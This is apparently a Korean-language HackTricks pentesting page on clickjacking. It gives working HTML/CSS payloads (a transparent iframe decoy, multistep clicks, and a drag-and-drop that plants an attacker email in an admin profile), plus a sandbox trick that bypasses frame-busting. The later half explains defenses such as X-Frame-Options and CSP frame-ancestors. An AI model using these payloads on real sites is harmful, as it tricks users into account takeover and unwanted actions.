# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjacking이란 무엇인가

Clickjacking 공격에서는 웹페이지의 한 **요소**가 **보이지 않거나** 다른 요소로 위장되어 **사용자**가 그 요소를 **클릭**하도록 **속임**을 당할 수 있다. 이러한 조작은 사용자가 의도하지 않은 결과를 초래할 수 있으며, 예를 들어 malware 다운로드, 악성 웹페이지로의 리디렉션, credentials 또는 민감한 정보의 제공, 금전 이체, 또는 제품의 온라인 구매 등이 있다.

### 폼 미리 채우기 트릭

때때로 **페이지를 로드할 때 GET parameters를 사용해 폼 필드의 값을 채울 수 있다**. 공격자는 이 동작을 악용하여 폼을 임의의 데이터로 채운 뒤 clickjacking payload를 전송하여 사용자가 Submit 버튼을 누르도록 유도할 수 있다.

### Drag\&Drop으로 폼 채우기

사용자에게 **폼을 작성**하도록 해야 하지만 특정 정보를 직접 입력하도록 요청하고 싶지 않다면(예: 당신이 알고 있는 이메일 또는 특정 비밀번호), 단지 그에게 당신이 제어하는 데이터를 작성하게 할 무언가를 **Drag\&Drop**하도록 요청하면 된다, 자세한 내용은 [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)를 참조하라.

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### 다중 단계 페이로드
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

만약 사용자가 어떤 요소를 클릭해야만 **XSS attack that requires a user to click**가 트리거되고 해당 페이지가 **vulnerable to clickjacking**하다면, 사용자를 속여 버튼/링크를 클릭하게 만들기 위해 이를 악용할 수 있습니다.\
예:\
계정의 일부 개인 정보(오직 **you can set and read** 수 있는 정보)에서 **self XSS**를 발견했습니다. 이 정보를 설정하는 **form**이 **vulnerable** to **Clickjacking**하고 GET parameters로 **prepopulate**할 수 있습니다.\
공격자는 해당 페이지에 대해 **Clickjacking** 공격을 준비해 **form**을 **prepopulating**하여 **XSS payload**를 넣고 **user**를 속여 **Submit**하도록 만들 수 있습니다. 따라서 **when the form is submitted**하고 값들이 변경되면, **user will execute the XSS**하게 됩니다.


### DoubleClickjacking

먼저 [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html)에서 설명된 것처럼, 이 기법은 피해자에게 특정 위치에 배치된 커스텀 페이지의 버튼을 더블클릭하도록 유도하고, mousedown과 onclick 이벤트 사이의 타이밍 차이를 이용해 더블클릭 중에 피해자 페이지를 로드하여 **victim actually clicks a legit button in the victim page**하게 만듭니다.

예제는 다음 비디오에서 볼 수 있습니다: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

코드 예제는 [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html)에서 확인할 수 있습니다.

> [!WARNING]
> 이 기법은 피해자 페이지의 한 곳을 클릭하도록 속여 clickjacking에 대한 모든 보호를 우회할 수 있게 합니다. 따라서 공격자는 **한 번의 클릭으로 수행할 수 있는 민감한 동작들(예: OAuth prompts accepting permissions)**을 찾아야 합니다.

### Browser extensions: DOM-based autofill clickjacking

iframe으로 피해자 페이지를 불러오는 것과 별개로, 공격자는 페이지에 주입되는 browser extension UI 요소를 노릴 수 있습니다. Password managers는 포커스된 입력 근처에 autofill 드롭다운을 렌더링합니다. 공격자가 제어하는 필드에 포커스를 주고 extension의 드롭다운을 숨기거나 가리는(opacity/overlay/top-layer tricks) 방식으로 강요된 클릭을 유도하면 저장된 항목을 선택해 민감한 데이터를 공격자가 제어하는 입력에 채우게 할 수 있습니다. 이 변형은 iframe 노출이 필요 없으며 전적으로 DOM/CSS 조작만으로 동작합니다.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

클라이언트 측에서 실행되는 스크립트는 Clickjacking을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다:

- 애플리케이션 창이 메인 또는 top 창인지 확인.
- 모든 frame을 보이게 만듦.
- 보이지 않는 frame에 대한 클릭을 차단.
- 잠재적 Clickjacking 시도를 탐지하고 사용자에게 경고.

그러나 이러한 frame-busting 스크립트는 우회될 수 있습니다:

- **Browsers' Security Settings:** 일부 브라우저는 보안 설정이나 JavaScript 미지원 때문에 이러한 스크립트를 차단할 수 있습니다.
- **HTML5 iframe sandbox Attribute:** 공격자는 allow-forms 또는 allow-scripts 값을 주되 allow-top-navigation을 주지 않는 sandbox attribute를 설정하여 frame buster 스크립트를 무력화할 수 있습니다. 이렇게 하면 iframe이 자신이 최상위 창인지 확인하지 못하게 됩니다. e.g.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The allow-forms and allow-scripts values enable actions within the iframe while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like allow-same-origin and allow-modals might be necessary, depending on the attack type. Browser console messages can guide which permissions to allow.

### 서버 측 방어

#### X-Frame-Options

The **X-Frame-Options HTTP response header** informs browsers about the legitimacy of rendering a page in a <frame> or <iframe>, helping to prevent Clickjacking:

- X-Frame-Options: deny - 어떤 도메인도 콘텐츠를 프레임에 표시할 수 없습니다.
- X-Frame-Options: sameorigin - 현재 사이트만 콘텐츠를 프레임에 표시할 수 있습니다.
- X-Frame-Options: allow-from https://trusted.com - 지정된 'uri'만 페이지를 프레임에 표시할 수 있습니다.
- 제한 사항에 유의하세요: 브라우저가 이 지시어를 지원하지 않으면 동작하지 않을 수 있습니다. 일부 브라우저는 CSP의 frame-ancestors 지시어를 선호합니다.

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** is the advised method for Clickjacking protection:

- frame-ancestors 'none' - X-Frame-Options: deny와 유사합니다.
- frame-ancestors 'self' - X-Frame-Options: sameorigin과 유사합니다.
- frame-ancestors trusted.com - X-Frame-Options: allow-from과 유사합니다.

For instance, the following CSP only allows framing from the same domain:

Content-Security-Policy: frame-ancestors 'self';

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with child-src and frame-src

**Content Security Policy (CSP)** is a security measure that helps in preventing Clickjacking and other code injection attacks by specifying which sources the browser should allow to load content.

#### frame-src Directive

- Defines valid sources for frames.
- More specific than the default-src directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
이 정책은 동일 출처 (self) 및 https://trusted-website.com의 프레임을 허용합니다.

#### child-src Directive

- CSP level 2에서 웹 워커와 프레임에 대한 유효한 소스를 설정하기 위해 도입되었습니다.
- frame-src 및 worker-src의 대체(fallback) 역할을 합니다.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
이 정책은 동일 출처(self) 및 https://trusted-website.com의 frames와 workers를 허용합니다.

**사용 시 참고:**

- 폐지 예정: child-src는 frame-src 및 worker-src로 대체되며 점차 사용 중단됩니다.
- 폴백 동작: frame-src가 없으면 child-src가 frames의 폴백으로 사용됩니다. 둘 다 없으면 default-src가 사용됩니다.
- 출처 엄격 정의: 악용을 방지하려면 지시어에 신뢰할 수 있는 출처만 포함하세요.

#### JavaScript 프레임 방지 스크립트

완벽하게 안전한 방법은 아니지만, JavaScript 기반의 프레임 방지 스크립트는 웹 페이지가 프레임에 포함되는 것을 방지하는 데 사용할 수 있습니다. 예:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens 적용

- **토큰 검증:** 웹 애플리케이션에서 anti-CSRF tokens를 사용하여 상태 변경 요청이 사용자의 의도에 따른 것인지, Clickjacked 페이지를 통해 발생한 것이 아닌지 확인하세요.

## 참고자료

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
